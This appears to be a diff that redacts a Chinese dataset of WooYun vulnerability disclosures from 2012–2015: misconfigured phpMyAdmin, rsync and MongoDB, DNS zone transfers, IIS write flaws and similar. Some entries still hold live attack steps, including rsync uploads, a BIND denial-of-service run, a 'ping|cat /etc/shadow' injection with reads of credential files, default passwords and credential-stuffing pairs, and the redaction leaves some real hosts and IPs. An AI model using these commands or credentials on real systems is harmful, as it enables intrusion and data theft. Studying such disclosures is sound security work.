-**详情**: 新浪http://comment.admin.sina.com.cn/cgi-bin/comment/adm_login.cgihttp://dealer.auto.henan.sina.com.cn/auto/4s-admin/login.phphttp://bug.show.sina.com.cn/admin/http://mindcity.sina.com.tw/admin/index.phphttp://cinema.ent.sina.com.cn/manage/login.php腾讯http://cgi.data.edu.qq.com/admin/web/login.htmlhttp://job.cd.qq.com/admin/http://admin.dnfcity.qq.com:8080/admin/adminMain.dohttp://support.qq.com/beta
+**详情**: 某社交平台https://example.com/[已脱敏]
 
-**POC**: 新浪http://comment.admin.sina.com.cn/cgi-bin/comment/adm_login.cgihttp://dealer.auto.henan.sina.com.cn/auto/4s-admin/login.phphttp://bug.show.sina.com.cn/admin/http://mindcity.sina.com.tw/admin/index.phphttp://cinema.ent.sina.com.cn/manage/login.php腾讯http://cgi.data.edu.qq.com/admin/web/login.htmlhttp
+**POC**: 某社交平台https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -24372,7 +24372,7 @@
 ---
 
 ---
-### [wooyun-2015-0161827] 某保险微信平台phpmyadmin无需账号密码直接访问
+### [wooyun-2015-0161827] 某保险某互联网公司平台phpmyadmin无需账号密码直接访问
 **厂商**: 新华人寿保险股份有限公司 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
@@ -24384,9 +24384,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新华保险微信平台phpmyadmin无需账号密码直接访问，可以直接操作该平台数据库（新增、删除、查询等）访问改地址http://123.127.246.34/phpmyadmin/无需账号密码即可控制该平台数据库
+**详情**: 新华保险某互联网公司平台phpmyadmin无需账号密码直接访问，可以直接操作该平台数据库（新增、删除、查询等）访问改地址http://[IP已脱敏]
 
-**POC**: 新华保险微信平台phpmyadmin无需账号密码直接访问，可以直接操作该平台数据库（新增、删除、查询等）访问改地址http://123.127.246.34/phpmyadmin/无需账号密码即可控制该平台数据库
+**POC**: 新华保险某互联网公司平台phpmyadmin无需账号密码直接访问，可以直接操作该平台数据库（新增、删除、查询等）访问改地址http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -24406,13 +24406,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://vpn.sohu-inc.com/+CSCOE+/logon.html   －－ CVE-2014-3393http://drops.wooyun.org/papers/3451
+**详情**: https://example.com/[已脱敏]   －－ CVE-2014-3393https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 补丁http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa
+**修复**: 补丁https://example.com/[已脱敏]
 ---
 
 ---
@@ -24428,7 +24428,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞地方 https://mail.yundasys.com/owa/#一直没找到一个好的工具，把Exchange里面的通讯录弄出来。Payload1	Payload2wangjianguo	000000wangtingting	000000zhanghaiyan	000000wanglei	111111liuyang	111111liujun	111111wangpeng	111111yangyong	111111lixiuzhen	111111wanghua	111111chengang	111111liujun	111111liuyang	111111zhanglong	111111wanglong	111111wanglei	111111wangwei	000000lijing	000000wangfang	000000zhangwei	000000wangchao	000000z
+**详情**: 漏洞地方 https://example.com/[已脱敏]	Payload2wangjianguo	000000wangtingting	000000zhanghaiyan	000000wanglei	111111liuyang	111111liujun	111111wangpeng	111111yangyong	111111lixiuzhen	111111wanghua	111111chengang	111111liujun	111111liuyang	111111zhanglong	111111wanglong	111111wanglei	111111wangwei	000000lijing	000000wangfang	000000zhangwei	000000wangchao	000000z
 
 **POC**: (见原文)
 
@@ -24450,7 +24450,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注射点：http://dhs.21vianet.com/dhs/site0.php?ID=55用户 root网站配置不当导致 web 路径泄漏
+**详情**: 注射点：https://example.com/[已脱敏] root网站配置不当导致 web 路径泄漏
 
 **POC**: 此处得到web路径读写文件set0.phpconf_21vianet.inc/etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdo
 
@@ -24494,18 +24494,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: IP:182.92.163.204 Mongodb 配置不当
+**详情**: IP:[IP已脱敏] Mongodb 配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 解决办法：http://drops.wooyun.org/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/2470
+**修复**: 解决办法：https://example.com/[已脱敏]
 ---
 
 ---
-### [wooyun-2015-0125118] 饿了么某系统疑似可以重新安装
-**厂商**: 饿了么 | **年份**: 2015 | **类型**: 应用配置错误
+### [wooyun-2015-0125118] 某外卖平台某系统疑似可以重新安装
+**厂商**: 某外卖平台 | **年份**: 2015 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -24516,9 +24516,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 'fast.ele.me': '112.65.166.115'
+**详情**: 'fast.ele.me': '[IP已脱敏]'
 
-**POC**: http://112.65.166.115:89/install/ (e-mobile移动协同)
+**POC**: http://[IP已脱敏] (e-mobile移动协同)
 
 **绕过**: 直接利用
 
@@ -24538,13 +24538,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 瑞达信息安全产业股份有限公司IIS写入漏洞，测试：http://www.jetsec.com.cn/guise.txt
+**详情**: 瑞达信息安全产业股份有限公司IIS写入漏洞，测试：https://example.com/[已脱敏]
 
-**POC**: 瑞达信息安全产业股份有限公司IIS写入漏洞，测试：http://www.jetsec.com.cn/guise.txt
+**POC**: 瑞达信息安全产业股份有限公司IIS写入漏洞，测试：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 瑞达信息安全产业股份有限公司IIS写入漏洞，测试：http://www.jetsec.com.cn/guise.txtngsst
+**修复**: 瑞达信息安全产业股份有限公司IIS写入漏洞，测试：https://example.com/[已脱敏]
 ---
 
 ---
@@ -24582,9 +24582,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: WooYun: 中青宝某 MongoDB 服务器配置不当（密码明文存储）通过上面的数据库名字才知道是中青宝某游戏的http://119.147.215.26:28017/
+**详情**: WooYun: 中青宝某 MongoDB 服务器配置不当（密码明文存储）通过上面的数据库名字才知道是中青宝某游戏的http://[IP已脱敏]
 
-**POC**: 另外：http://119.147.215.26/80端口是OpManager  直接可以访问
+**POC**: 另外：http://[IP已脱敏]  直接可以访问
 
 **绕过**: 直接利用
 
@@ -24592,8 +24592,8 @@
 ---
 
 ---
-### [wooyun-2012-012279] 中国电信缴费终端机限制不严格
-**厂商**: 中国电信 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-012279] 某运营商缴费终端机限制不严格
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -24626,9 +24626,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:http://passport.secoo.com/findPassword/findpass3.jsp?userName=http://passport.secoo.com/findPassword/findpass3.jsp?userName=13352522789&sign=64629973412A8DA41C6AA3FBAF2E76BF直接修改密码sian有了现在，我们改成123456登录看看再看看其他一个用户http://passport.secoo.com/findPassword/findpass3.jsp?userName=18611832868&sign=7C4E692A6F8A663B372002DA635DE7EA同样一样556677
+**详情**: inurl:https://example.com/[已脱敏]
 
-**POC**: http://passport.secoo.com/findPassword/findpass3.jsp?userName=13352522789&sign=64629973412A8DA41C6AA3FBAF2E76BFhttp://passport.secoo.com/findPassword/findpass3.jsp?userName=18980683633&sign=EF9D573E8196219DF6374E1CA4A03A0A’http://passport.secoo.com/findPassword/findpass3.jsp?userName=18611832868&sig
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -24692,7 +24692,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://211.151.235.25/log/起初还以为不是。。<elong_root><user>Wx.sohu</user><password>OTQzNTIxNjIxMjY0QzI1MUEzQTgwQzQ0NjI0QjlENDg=</password></elong_root>base64解码后是md5.
+**详情**: http://[IP已脱敏]
 
 **POC**: 看了下webservice才得知。。CRMService不多截图了，好在都是老数据。。
 
@@ -24714,7 +24714,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 最新爆出来的漏洞 批量验证下面这些地址均受影响41.159.55.35193.85.7.3514.139.110.5174.94.47.178212.156.31.5470.109.255.158201.101.20.244165.228.5.114111.93.74.174196.41.106.11568.115.219.26105.228.65.0195.31.90.186187.6.109.115186.67.201.6175.102.170.8137.128.120.130195.235.120.147210.196.188.14574.142.206.367.52.249.198119.73.242.20267.55.155.134165.228.85.11975.138.138.4680.86.150.90119.226.247.121181.48.191.222187.4.5
+**详情**: 最新爆出来的漏洞 批量验证下面这些地址均受影响41.159.55.35193.85.7.3514.139.110.5174.94.47.178212.156.31.5470.109.255.158201.101.20.244165.228.5.114111.93.74.174196.41.106.11568.115.219.26105.228.65.0195.31.90.186187.6.109.115186.67.201.6175.102.170.8137.128.120.130195.235.120.147210.196.188.14574.[IP已脱敏].249.198119.73.242.20267.55.155.134165.228.85.11975.138.138.4680.86.150.90119.226.247.121181.48.191.222187.4.5
 
 **POC**: (见原文)
 
@@ -24736,7 +24736,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 福昕软件 http://www.foxitsoftware.cn/
+**详情**: 福昕软件 https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -24780,9 +24780,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.jhccb.com.cn/x.txt
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://www.jhccb.com.cn/x.txt
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -24802,9 +24802,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题站点http://smsold.tdxinfo.com/列目录 ：（大量web日志文件）http://smsold.tdxinfo.com/bycinnersys/images/http://smsold.tdxinfo.com/bycinnersys/UpLoadFile/web日志：http://smsold.tdxinfo.com/bycinnersys/logs/web配置文件http://smsold.tdxinfo.com/bycinnersys/web.zip
+**详情**: 问题站点https://example.com/[已脱敏] ：（大量web日志文件）https://example.com/[已脱敏]
 
-**POC**: http://smsold.tdxinfo.com/bycinnersys/images/http://smsold.tdxinfo.com/bycinnersys/UpLoadFile/web日志：http://smsold.tdxinfo.com/bycinnersys/logs/web配置文件http://smsold.tdxinfo.com/bycinnersys/web.zip
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -24824,9 +24824,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: rsync 211.151.94.241::gen/cat hosts# Do not remove the following line, or various programs# that require network functionality will fail.127.0.0.1       localhost202.205.109.141 debian141.eol.cn        debian141# The following lines are desirable for IPv6 capable hosts# ::1     ip6-localhost ip6-loopback# fe00::0 ip6-localnet# ff00::0 ip6-mcastprefix# ff02::1 ip6-allnodes# ff02::2 ip6-allrouters# 
+**详情**: rsync [IP已脱敏]::gen/cat hosts# Do not remove the following line, or various programs# that require network functionality will fail.[IP已脱敏]       localhost202.205.109.141 debian141.eol.cn        debian141# The following lines are desirable for IPv6 capable hosts# ::1     ip6-localhost ip6-loopback# fe00::0 ip6-localnet# ff00::0 ip6-mcastprefix# ff02::1 ip6-allnodes# ff02::2 ip6-allrouters# 
 
-**POC**: rsync 211.151.94.241::gen/cat hosts# Do not remove the following line, or various programs# that require network functionality will fail.127.0.0.1       localhost202.205.109.141 debian141.eol.cn        debian141# The following lines are desirable for IPv6 capable hosts# ::1     ip6-localhost ip6-loo
+**POC**: rsync [IP已脱敏]::gen/cat hosts# Do not remove the following line, or various programs# that require network functionality will fail.[IP已脱敏]       localhost202.205.109.141 debian141.eol.cn        debian141# The following lines are desirable for IPv6 capable hosts# ::1     ip6-localhost ip6-loo
 
 **绕过**: 直接利用
 
@@ -24868,7 +24868,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: @cncert国家互联网应急中心泄漏地址：https://github.com/a1357479/techan/blob/5792d078790f56dc1b852ba23e863ecfe851cf34/Application/Common/Conf/config.php
+**详情**: @cncert国家互联网应急中心泄漏地址：https://example.com/[已脱敏]
 
 **POC**: 连接数据库查询 用户名 和 密码MD5值解码MD5 后然后就得到了下面这个漏洞里土豪的密码WooYun: 互联网金融安全之闲钱宝同理 caoxinjing 这个用户的密码也可以 查到登陆一下
 
@@ -24912,7 +24912,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 金融界# DNS域传送漏洞一枚C:\Users\Administrator>nslookup默认服务器:  google-public-dns-a.google.comAddress:  8.8.8.8> set type=ns> jrj.com.cn服务器:  google-public-dns-a.google.comAddress:  8.8.8.8非权威应答:jrj.com.cn      nameserver = dns1.jrj.com.cnjrj.com.cn      nameserver = dns.jrj.com.cn> server dns1.jrj.com.cn默认服务器:  dns1.jrj.com.cnAddress:  123.126.155.110>ls jrj.com.cn    （很多的。。。）..dhqxsupport                 
+**详情**: 金融界# DNS域传送漏洞一枚C:\Users\Administrator>nslookup默认服务器:  google-public-dns-a.google.comAddress:  [IP已脱敏]> set type=ns> jrj.com.cn服务器:  google-public-dns-a.google.comAddress:  [IP已脱敏]非权威应答:jrj.com.cn      nameserver = dns1.jrj.com.cnjrj.com.cn      nameserver = dns.jrj.com.cn> server dns1.jrj.com.cn默认服务器:  dns1.jrj.com.cnAddress:  [IP已脱敏]>ls jrj.com.cn    （很多的。。。）..dhqxsupport                 
 
 **POC**: 如上。
 
@@ -24934,7 +24934,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 没有关闭注册，导致内部信息任意查看http://113.108.182.3:22580/login.jspwooyun/123456
+**详情**: 没有关闭注册，导致内部信息任意查看http://[IP已脱敏]
 
 **POC**: 可以删除项目问题搞破坏
 
@@ -24956,9 +24956,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 搜狐一内部系统后台泄漏http://hz.tl.sohu.com:8196/wfms/login.jsp
+**详情**: 搜狐一内部系统后台泄漏https://example.com/[已脱敏]
 
-**POC**: http://hz.tl.sohu.com:8196/wfms/login.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -24988,8 +24988,8 @@
 ---
 
 ---
-### [wooyun-2015-0162437] 中国移动某系统存在JAVA反序列化漏洞！
-**厂商**: 中国移动 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-0162437] 某运营商某系统存在JAVA反序列化漏洞！
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -25000,9 +25000,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国移动某系统存在JAVA反序列化漏洞！系统地址：**.**.**.**:8000通过java反序列化工具好了，就这些吧！
+**详情**: 某运营商某系统存在JAVA反序列化漏洞！系统地址：**.**.**.**:8000通过java反序列化工具好了，就这些吧！
 
-**POC**: 中国移动某系统存在JAVA反序列化漏洞！系统地址：**.**.**.**:8000通过java反序列化工具好了，就这些吧！
+**POC**: 某运营商某系统存在JAVA反序列化漏洞！系统地址：**.**.**.**:8000通过java反序列化工具好了，就这些吧！
 
 **绕过**: 直接利用
 
@@ -25010,8 +25010,8 @@
 ---
 
 ---
-### [wooyun-2012-07000] TX QQ群系统一个BUG
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-07000] TX 某互联网公司群系统一个BUG
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -25032,8 +25032,8 @@
 ---
 
 ---
-### [wooyun-2012-04708] 新浪某服务器配服不当，泄露大量微博相关信息！
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-04708] 某社交平台某服务器配服不当，泄露大量某社交平台相关信息！
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -25054,8 +25054,8 @@
 ---
 
 ---
-### [wooyun-2012-010545] QQ电影票影院后台管理地址泄露
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-010545] 某互联网公司电影票影院后台管理地址泄露
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 后台管理
 
@@ -25066,9 +25066,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: QQ电影票影院后台管理地址泄露http://gl.dianying.qq.com/login.html
+**详情**: 某互联网公司电影票影院后台管理地址泄露https://example.com/[已脱敏]
 
-**POC**: QQ电影票影院后台管理地址泄露http://gl.dianying.qq.com/login.html
+**POC**: 某互联网公司电影票影院后台管理地址泄露https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -25088,7 +25088,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://180.166.69.180/public直接git clone
+**详情**: http://[IP已脱敏] clone
 
 **POC**: (见原文)
 
@@ -25110,7 +25110,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 可使用工具 天蝎工具集中伪造邮件插件，也可以使用网站 https://emkei.cz/ 提供的服务器，或者其他插件。
+**详情**: 可使用工具 天蝎工具集中伪造邮件插件，也可以使用网站 https://example.com/[已脱敏] 提供的服务器，或者其他插件。
 
 **POC**: (见原文)
 
@@ -25132,7 +25132,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://218.28.172.10/oa/loginPwd.jsp上大必硬发生啥事，连密码懒得输入。。。
+**详情**: http://[IP已脱敏]
 
 **POC**: 还有许多功能未挖掘出来。。
 
@@ -25154,7 +25154,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://mail.jiangxia.gov.cn/create.asp  好吧直接注册了。
+**详情**: https://example.com/[已脱敏]  好吧直接注册了。
 
 **POC**: (见原文)
 
@@ -25164,8 +25164,8 @@
 ---
 
 ---
-### [wooyun-2014-075980] 京东未关闭php错误信息
-**厂商**: 京东商城 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-075980] 某电商平台未关闭php错误信息
+**厂商**: 某电商平台商城 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -25176,9 +25176,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 打开链接：http://www.jd.com/pinpai/authcode.php?returnUrl=http%3A%2F%2Fwww.jd.com%2F出现访问数组未定义键值警告：Notice: Undefined index: keyword in /export/data/www/search.360buy.com/core/XTest.php on line 23生产环境未关闭php错误回显可能带来潜在的风险不用多说了吧
+**详情**: 打开链接：https://example.com/[已脱敏] Undefined index: keyword in /export/data/www/search.360buy.com/core/XTest.php on line 23生产环境未关闭php错误回显可能带来潜在的风险不用多说了吧
 
-**POC**: 打开链接：http://www.jd.com/pinpai/authcode.php?returnUrl=http%3A%2F%2Fwww.jd.com%2F出现访问数组未定义键值警告：Notice: Undefined index: keyword in /export/data/www/search.360buy.com/core/XTest.php on line 23
+**POC**: 打开链接：https://example.com/[已脱敏] Undefined index: keyword in /export/data/www/search.360buy.com/core/XTest.php on line 23
 
 **绕过**: 直接利用
 
@@ -25198,13 +25198,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.chinamil.com.cn/ns1.chinamil.com.cn&ns2.chinamil.com.cn都存在域传送。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参考：http://drops.wooyun.org/papers/64
+**修复**: 参考：https://example.com/[已脱敏]
 ---
 
 ---
@@ -25220,9 +25220,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://cs.tnet.hk/时代互联某分站dedecms的默认安装页面为删除http://cs.tnet.hk/install/index.php不敢再进一步了，怕破坏掉你们的数据
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://cs.tnet.hk/时代互联某分站dedecms的默认安装页面为删除http://cs.tnet.hk/install/index.php不敢再进一步了，怕破坏掉你们的数据
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -25244,7 +25244,7 @@
 
 **详情**: ISC BIND是美国Internet Systems Consortium（ISC）公司所维护的一套DNS域名解析服务软件。该软件被披露存在拒绝服务漏洞，由于TKEY查询的错误可导致BIND服务器发生REQUIRE断言失败并停止服务，攻击者利用漏洞可恶意构造数据包，导致TKEY记录查询错误，进而导致BIND服务器发生REQUIRE断言失败并停止服务。CNVD对该漏洞的综合评级为“高危”。
 
-**POC**: dns查询：dig 6.cn以ns1.6.cn为测试对象dig @ns1.6.cn 6.cn其中ns1.6.cn.		1800	IN	A	122.70.135.62上利用pocpython dos.py 122.70.135.62再次查询：dig @ns1.6.cn 6.cn已经拒绝服务了
+**POC**: dns查询：dig 6.cn以ns1.6.cn为测试对象dig @ns1.6.cn 6.cn其中ns1.6.cn.		1800	IN	A	[IP已脱敏]上利用pocpython dos.py [IP已脱敏]再次查询：dig @ns1.6.cn 6.cn已经拒绝服务了
 
 **绕过**: 直接利用
 
@@ -25310,7 +25310,7 @@
 
 **详情**: 北京市发展和改革委员会dns域传送漏洞
 
-**POC**: C:\>nslookup -qt=ns bjpc.gov.cnbjpc.gov.cn     nameserver = ns1.beic.gov.cnbjpc.gov.cn     nameserver = ns2.beic.gov.cnC:\>nslookup> server ns1.beic.gov.cnDefault Server:  ns1.beic.gov.cnAddress:  61.135.238.2> ls bjpc.gov.cn[ns1.beic.gov.cn]bjpc.gov.cn.                   NS     server = ns1.beic.go
+**POC**: C:\>nslookup -qt=ns bjpc.gov.cnbjpc.gov.cn     nameserver = ns1.beic.gov.cnbjpc.gov.cn     nameserver = ns2.beic.gov.cnC:\>nslookup> server ns1.beic.gov.cnDefault Server:  ns1.beic.gov.cnAddress:  [IP已脱敏]> ls bjpc.gov.cn[ns1.beic.gov.cn]bjpc.gov.cn.                   NS     server = ns1.beic.go
 
 **绕过**: 直接利用
 
@@ -25332,7 +25332,7 @@
 
 **详情**: 
 
-**POC**: rsync 60.28.209.14::kx_seopv_log
+**POC**: rsync [IP已脱敏]::kx_seopv_log
 
 **绕过**: 直接利用
 
@@ -25352,7 +25352,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 肇庆市国有资产监督管理委员会http://61.146.213.142//test.txt
+**详情**: 肇庆市国有资产监督管理委员会http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -25374,7 +25374,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: # nginx 中间件配置不当，导致任意代码执行http://brandbase.mama.cn/robots.txt/a.phphttp://www.shantoumama.com/robots.txt/a.phphttp://91baby.mama.cn/robots.txt/a.php
+**详情**: # nginx 中间件配置不当，导致任意代码执行https://example.com/[已脱敏]
 
 **POC**: # 任意文件直接当做php解析
 
@@ -25396,9 +25396,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://weixin.1yyg.com/member/index.do 微信接口.先说说云购的防爆破机制,属帐号登录密码错误6次以上,将直接锁定帐号,这样可以针对单一的帐号被盗有好处,但是对于撞库却无法很好的阻止.....因为主站采用了https的方式,抓包爆破有困难.
+**详情**: https://example.com/[已脱敏] 某互联网公司接口.先说说云购的防爆破机制,属帐号登录密码错误6次以上,将直接锁定帐号,这样可以针对单一的帐号被盗有好处,但是对于撞库却无法很好的阻止.....因为主站采用了https的方式,抓包爆破有困难.
 
-**POC**: 217946000@qq.com  w333671314538632@qq.com lichao8695zxgecf@163.com  gecf309100撞着卡,,,就这样了...
+**POC**: 217946000@某互联网公司.com  w333671314538632@某互联网公司.com lichao8695zxgecf@163.com  gecf309100撞着卡,,,就这样了...
 
 **绕过**: 直接利用
 
@@ -25440,7 +25440,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://city.the9.com/news/more.php?area=zithttp://city.the9.com/treasure/tr_info.php.....还有部分...
+**详情**: https://example.com/[已脱敏]
 
 **POC**: =========================
 
@@ -25462,9 +25462,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: root@kali:~# nmap -sS -Pn --open -p 873 www.lppz.com/24Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-16 00:03 CSTNmap scan report for 116.211.81.199Host is up (0.042s latency).PORT    STATE SERVICE873/tcp open  rsyncNmap done: 256 IP addresses (256 hosts up) scanned in 8.96 secondsroot@kali:~# rsync 116.211.81.199::rsync_log2     	log file rsyncrsync_log      	log file rsyncrsync_log_aly
+**详情**: root@kali:~# nmap -sS -Pn --open -p 873 www.lppz.com/24Starting Nmap 6.49BETA4 ( https://example.com/[已脱敏] ) at 2015-09-16 00:03 CSTNmap scan report for [IP已脱敏]Host is up (0.042s latency).PORT    STATE SERVICE873/tcp open  rsyncNmap done: 256 IP addresses (256 hosts up) scanned in 8.96 secondsroot@kali:~# rsync [IP已脱敏]::rsync_log2     	log file rsyncrsync_log      	log file rsyncrsync_log_aly
 
-**POC**: 测试上传：root@kali:~# cat testtest from wooyun lurenjiaroot@kali:~# chmod a+s testroot@kali:~# rsync -avz test 116.211.81.199::rsync_log/sending incremental file listtestsent 107 bytes  received 34 bytes  282.00 bytes/sectotal size is 26  speedup is 0.18其余两个也一样，就不赘述了
+**POC**: 测试上传：root@kali:~# cat testtest from wooyun lurenjiaroot@kali:~# chmod a+s testroot@kali:~# rsync -avz test [IP已脱敏]::rsync_log/sending incremental file listtestsent 107 bytes  received 34 bytes  282.00 bytes/sectotal size is 26  speedup is 0.18其余两个也一样，就不赘述了
 
 **绕过**: 直接利用
 
@@ -25506,7 +25506,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 利用百度获取案例site:**.**.**.**http://gt1406043.**.**.**.**:10000/  seccn2012/seccn2012http://gs1402096.**.**.**.**:10000/ admin/888888http://gt1504238.**.**.**.**:10000/ seccn2012/seccn2012http://gt1504345.**.**.**.**:10000/ admin/888888http://gt1501031.**.**.**.**:10000/ seccn2012/seccn2012http://gt1312248.**.**.**.**:10000/ admin/888888http://gt1401126.**.**.**.**:10000/ seccn2012/seccn2012http://gt15
+**详情**: 利用某搜索引擎获取案例site:**.**.**.**http://gt1406043.**.**.**.**:10000/  seccn2012/seccn2012http://gs1402096.**.**.**.**:10000/ admin/888888http://gt1504238.**.**.**.**:10000/ seccn2012/seccn2012http://gt1504345.**.**.**.**:10000/ admin/888888http://gt1501031.**.**.**.**:10000/ seccn2012/seccn2012http://gt1312248.**.**.**.**:10000/ admin/888888http://gt1401126.**.**.**.**:10000/ seccn2012/seccn2012http://gt15
 
 **POC**: 在“漏洞标题： SECCN VPN系列产品控制台命令执行缺陷（可绕过限制任意执行操作系统命令） ”中我们执行ping|cat /etc/shadow&对获取到的shadow进行解密，获取到密码为rowhoami登录**.**.**.**登录**.**.**.**登录**.**.**.**执行cat /etc/ppp/pap-secrets查看vpn用户信息执行cat /etc/webmin/miniserv.users查看web控制台密码
 
@@ -25528,7 +25528,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #1.首先从邮箱系统入手。使用的是outlook web app邮箱。fuzz出几个用户。wangling@fruitday.com原始密码是123456.但是好像你们调整了密码复杂度策略。这个密码失效了。然后让输入新密码。我就顺手给改了。wangling123!登陆成功了联系人列表有了，那就有了个更准确的字典了然后在乌云@平顶山 大叔的漏洞里，收集了一些系统地址。还有平顶山的常用密码字典fday2015 fruitday那么幸福就来的太突然了、http://cang.fday.xyz/先进仓库再来打印最后找到全部订单http://dingdan.fday.co/libo--fday2015目测是一直刷新的
+**详情**: #1.首先从邮箱系统入手。使用的是outlook web app邮箱。fuzz出几个用户。wangling@fruitday.com原始密码是123456.但是好像你们调整了密码复杂度策略。这个密码失效了。然后让输入新密码。我就顺手给改了。wangling123!登陆成功了联系人列表有了，那就有了个更准确的字典了然后在乌云@平顶山 大叔的漏洞里，收集了一些系统地址。还有平顶山的常用密码字典fday2015 fruitday那么幸福就来的太突然了、https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -25550,7 +25550,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://202.108.133.207/存在iis写权限漏洞先put再move导致整站沦陷
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -25572,7 +25572,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://111.13.5.98:8080/
+**详情**: http://[IP已脱敏]
 
 **POC**: 图片说话
 
@@ -25618,7 +25618,7 @@
 
 **详情**: 偶然发现浙江省国土厅官网下的一个子模块所在服务竟然出现445端口开放，且有许多敏感文件暴露<img src="首页" alt="" />地址资料目录检索系统：
 
